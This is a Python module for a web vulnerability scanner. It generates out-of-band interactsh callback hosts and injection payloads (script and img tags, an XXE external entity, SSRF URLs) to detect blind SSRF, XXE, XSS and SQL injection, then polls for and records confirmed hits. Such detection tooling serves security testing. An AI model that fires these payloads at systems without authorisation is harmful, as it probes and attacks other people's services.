"""
Interactsh client for detecting blind vulnerabilities (SSRF, XXE, blind XSS, blind SQLi).

Uses ProjectDiscovery's interactsh-client CLI or the public OOB server.
Generates unique callback URLs, injects them as payloads, and polls for interactions.
"""

import hashlib
import json
import logging
import os
import subprocess
import threading
import time
from datetime import datetime
from typing import Any

from app.database import get_redis

logger = logging.getLogger("scanner.interactsh")

INTERACTSH_SERVER = os.getenv("INTERACTSH_SERVER", "oast.fun")
INTERACTSH_TOKEN = os.getenv("INTERACTSH_TOKEN", "").strip()
INTERACTSH_POLL_INTERVAL = int(os.getenv("INTERACTSH_POLL_INTERVAL", "10"))
INTERACTSH_ENABLED = os.getenv("INTERACTSH_ENABLED", "true").lower() in ("1", "true", "yes")

_client_id: str | None = None
_correlation_id: str | None = None
_secret_key: str | None = None
_interactions: list[dict] = []
_interactions_lock = threading.Lock()
_running = False

_stats = {
    "payloads_generated": 0,
    "interactions_received": 0,
    "blind_vulns_confirmed": 0,
}
_stats_lock = threading.Lock()


def _inc_stat(key: str, n: int = 1) -> None:
    with _stats_lock:
        _stats[key] = _stats.get(key, 0) + n


def get_interactsh_stats() -> dict[str, Any]:
    with _stats_lock:
        return dict(_stats)


def _generate_correlation_id() -> str:
    """Generate a unique correlation ID for this scanner instance."""
    import uuid
    return uuid.uuid4().hex[:20]


def _store_payload_mapping(payload_id: str, context: dict) -> None:
    """Store mapping between payload ID and scan context in Redis."""
    try:
        r = get_redis()
        key = f"interactsh:payload:{payload_id}"
        r.setex(key, 86400, json.dumps(context, default=str))
    except Exception:
        pass


def _get_payload_context(payload_id: str) -> dict | None:
    """Retrieve scan context for a payload ID."""
    try:
        r = get_redis()
        key = f"interactsh:payload:{payload_id}"
        data = r.get(key)
        if data:
            return json.loads(data)
    except Exception:
        pass
    return None


def generate_payload(context: dict) -> str:
    """Generate a unique interactsh callback URL for a specific scan context.

    context should include: target, vuln_type, parameter, scanner_module
    Returns a URL like: https://<unique-id>.oast.fun
    """
    global _correlation_id

    if not _correlation_id:
        _correlation_id = _generate_correlation_id()

    target = context.get("target", "unknown")
    vuln_type = context.get("vuln_type", "generic")
    param = context.get("parameter", "")
    ts = str(int(time.time()))

    raw = f"{_correlation_id}:{target}:{vuln_type}:{param}:{ts}"
    payload_id = hashlib.md5(raw.encode()).hexdigest()[:12]

    _store_payload_mapping(payload_id, {
        **context,
        "payload_id": payload_id,
        "created_at": datetime.utcnow().isoformat(),
    })

    _inc_stat("payloads_generated")

    callback_host = f"{payload_id}.{INTERACTSH_SERVER}"
    return callback_host


def generate_payload_variants(context: dict) -> dict[str, str]:
    """Generate multiple payload formats for different injection points."""
    base_host = generate_payload(context)

    return {
        "url": f"https://{base_host}",
        "url_http": f"http://{base_host}",
        "dns": base_host,
        "url_with_path": f"https://{base_host}/scanner",
        "img_tag": f'<img src="https://{base_host}/img">',
        "script_tag": f'<script src="https://{base_host}/js"></script>',
        "xxe_entity": f'<!ENTITY xxe SYSTEM "https://{base_host}/xxe">',
        "ssrf_redirect": f"https://{base_host}/redirect",
        "email": f"scanner@{base_host}",
    }


def poll_interactions() -> list[dict]:
    """Poll interactsh server for new interactions using the CLI."""
    interactions = []

    try:
        cmd = ["interactsh-client", "-server", INTERACTSH_SERVER, "-json", "-poll-interval", "1", "-n", "1"]
        if INTERACTSH_TOKEN:
            cmd.extend(["-token", INTERACTSH_TOKEN])

        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=15,
        )

        for line in result.stdout.strip().splitlines():
            if not line.strip():
                continue
            try:
                obj = json.loads(line)
                interaction = {
                    "protocol": obj.get("protocol", "unknown"),
                    "full_id": obj.get("full-id", ""),
                    "unique_id": obj.get("unique-id", ""),
                    "raw_request": obj.get("raw-request", "")[:2000],
                    "raw_response": obj.get("raw-response", "")[:1000],
                    "remote_address": obj.get("remote-address", ""),
                    "timestamp": obj.get("timestamp", ""),
                    "type": obj.get("type", ""),
                }

                payload_id = interaction["unique_id"][:12] if interaction["unique_id"] else ""
                context = _get_payload_context(payload_id)
                if context:
                    interaction["context"] = context
                    interaction["confirmed_blind_vuln"] = True
                    _inc_stat("blind_vulns_confirmed")
                else:
                    interaction["confirmed_blind_vuln"] = False

                interactions.append(interaction)
                _inc_stat("interactions_received")

            except json.JSONDecodeError:
                continue

    except FileNotFoundError:
        logger.debug("[INTERACTSH] interactsh-client not installed, using DNS-only polling")
        interactions = _poll_dns_fallback()
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        logger.debug("[INTERACTSH] Poll error: %s", e)

    return interactions


def _poll_dns_fallback() -> list[dict]:
    """Fallback: check Redis for any recorded interactions from webhook endpoints."""
    interactions = []
    try:
        r = get_redis()
        keys = r.keys("interactsh:callback:*")
        for key in keys:
            data = r.get(key)
            if data:
                interaction = json.loads(data)
                interaction["confirmed_blind_vuln"] = True
                interactions.append(interaction)
                r.delete(key)
                _inc_stat("interactions_received")
                _inc_stat("blind_vulns_confirmed")
    except Exception:
        pass
    return interactions


def record_callback(payload_id: str, protocol: str, remote_addr: str, raw_data: str = "") -> None:
    """Record a callback received (used by webhook endpoint in main.py)."""
    try:
        r = get_redis()
        context = _get_payload_context(payload_id)
        interaction = {
            "payload_id": payload_id,
            "protocol": protocol,
            "remote_address": remote_addr,
            "raw_data": raw_data[:2000],
            "timestamp": datetime.utcnow().isoformat(),
            "context": context,
            "confirmed_blind_vuln": context is not None,
        }
        key = f"interactsh:callback:{payload_id}:{int(time.time())}"
        r.setex(key, 86400, json.dumps(interaction, default=str))
    except Exception as e:
        logger.debug("[INTERACTSH] Record callback error: %s", e)


def get_confirmed_vulns() -> list[dict]:
    """Get all confirmed blind vulnerabilities from interactions."""
    try:
        r = get_redis()
        keys = r.keys("interactsh:confirmed:*")
        vulns = []
        for key in keys:
            data = r.get(key)
            if data:
                vulns.append(json.loads(data))
        return vulns
    except Exception:
        return []


def _save_confirmed_vuln(interaction: dict) -> None:
    """Save a confirmed blind vulnerability."""
    try:
        r = get_redis()
        context = interaction.get("context", {})
        vuln = {
            "target": context.get("target", ""),
            "vuln_type": context.get("vuln_type", ""),
            "parameter": context.get("parameter", ""),
            "protocol": interaction.get("protocol", ""),
            "remote_address": interaction.get("remote_address", ""),
            "confirmed_at": datetime.utcnow().isoformat(),
            "interaction": interaction,
        }
        key = f"interactsh:confirmed:{context.get('target', 'unknown')}:{int(time.time())}"
        r.setex(key, 604800, json.dumps(vuln, default=str))
    except Exception:
        pass


def _poll_loop() -> None:
    """Background polling loop for interactsh interactions."""
    global _running
    _running = True
    logger.info("[INTERACTSH] Polling started (interval=%ds)", INTERACTSH_POLL_INTERVAL)

    while _running:
        try:
            interactions = poll_interactions()
            for interaction in interactions:
                if interaction.get("confirmed_blind_vuln"):
                    _save_confirmed_vuln(interaction)
                    ctx = interaction.get("context", {})
                    logger.info(
                        "[INTERACTSH] BLIND VULN CONFIRMED: %s on %s (param=%s, protocol=%s)",
                        ctx.get("vuln_type", "unknown"),
                        ctx.get("target", "unknown"),
                        ctx.get("parameter", ""),
                        interaction.get("protocol", ""),
                    )
        except Exception as e:
            logger.debug("[INTERACTSH] Poll loop error: %s", e)

        time.sleep(INTERACTSH_POLL_INTERVAL)


def start_interactsh_poller() -> None:
    """Start the background interaction poller."""
    if not INTERACTSH_ENABLED:
        logger.info("[INTERACTSH] Disabled")
        return

    t = threading.Thread(target=_poll_loop, daemon=True)
    t.start()
    logger.info("[INTERACTSH] Client active (server=%s)", INTERACTSH_SERVER)


def stop_interactsh_poller() -> None:
    global _running
    _running = False
